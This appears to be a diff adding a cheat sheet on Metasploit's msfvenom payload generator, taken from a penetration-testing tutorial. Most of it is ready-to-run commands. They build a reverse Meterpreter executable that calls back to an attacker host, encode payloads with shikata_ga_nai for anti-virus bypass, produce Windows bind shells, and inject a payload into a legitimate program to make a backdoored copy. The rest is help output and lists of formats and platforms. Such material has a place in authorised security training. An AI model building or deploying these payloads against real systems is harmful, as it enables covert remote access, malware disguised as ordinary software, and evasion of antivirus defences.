@@ -1,0 +1,136 @@
+https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+
+msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.
+
+The advantages of msfvenom are:
+
+One single tool
+Standardized command line options
+Increased speed
+
+**msfvenom**
+The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
+them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.
+
+$ msfvenom –p [PayloadPath]
+–f [FormatType]
+LHOST=[LocalHost (if reverse conn.)]
+LPORT=[LocalPort]
+
+#Example
+Reverse Meterpreter payload as an executable and redirected into a file:
+
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -f exe LHOST=10.1.1.1
+LPORT=4444 > met.exe
+
+#Format Options (specified with –f)
+--help-formats – List available output formats
+exe – Executable
+pl – Perl
+rb – Ruby
+raw – Raw shellcode
+c – C code
+
+#Encoding Payloads with msfvenom
+The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'
+to get a list of encoders.
+
+$ msfvenom -p [Payload] -e [Encoder] -f
+[FormatType] -i [EncodeInterations]
+LHOST=[LocalHost (if reverse conn.)]
+LPORT=[LocalPort]
+
+#Example
+Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:
+
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -i 5 -e x86/shikata_ga_nai -f
+exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
+
+
+The next shellcode generates a Windows bind shell with three iterations of the shikata_ga_nai encoder without any null bytes and in the python format.
+
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python --smallest
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
+# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
+# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw > messageBox2
+Adding shellcode from messageBox to the payload
+# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+# msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+
+# msfvenom -n, –nopsled
+
+
+
+
+
+
+# msfvenom -h
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>
+Options:
+ -p, --payload <payload> Payload to use. Specify a '-' or stdin to use custom payloads
+     --payload-options List the payload's standard options
+ -l, --list [type] List a module type. Options are: payloads, encoders, nops, all
+ -n, --nopsled <length> Prepend a nopsled of [length] size on to the payload
+ -f, --format <format> Output format (use --help-formats for a list)
+     --help-formats List available formats
+ -e, --encoder <encoder> The encoder to use
+ -a, --arch <arch> The architecture to use
+     --platform <platform> The platform of the payload
+ -s, --space <length> The maximum size of the resulting payload
+     --encoder-space <length> The maximum size of the encoded payload (defaults to the -s value)
+ -b, --bad-chars <list> The list of characters to avoid example: '\x00\xff'
+ -i, --iterations <count> The number of times to encode the payload
+ -c, --add-code <path> Specify an additional win32 shellcode file to include
+ -x, --template <path> Specify a custom executable file to use as a template
+ -k, --keep Preserve the template behavior and inject the payload as a new thread
+ -o, --out <path> Save the payload
+ -v, --var-name <name> Specify a custom variable name to use for certain output formats
+     --smallest Generate the smallest possible payload
+ -h, --help Show this message
+
+
+# msfvenom –help-format
+
+Executable formats
+asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
+hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
+psh-cmd, vba, vba-exe, vba-psh, vbs, war
+Transform formats 
+bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, 
+powershell, ps1, py, python, raw, rb, ruby, sh,
+vbapplication, vbscript
+
+
+ [MSFvenom Platforms]
+
+ Cisco or cisco
+OSX or osx
+Solaris or solaris
+BSD or bsd
+OpenBSD or openbsd
+Firefox or firefox
+BSDi or bsdi
+NetBSD or netbsd
+NodeJS or nodejs
+FreeBSD or freebsd
+Python or python
+AIX or aix
+JavaScript or javascript
+HPUX or hpux
+PHP or php
+Irix or irix
+Unix or unix
+Linux or linux
+Ruby or ruby
+Java or java
+Android or android
+Netware or netware
+Windows or windows
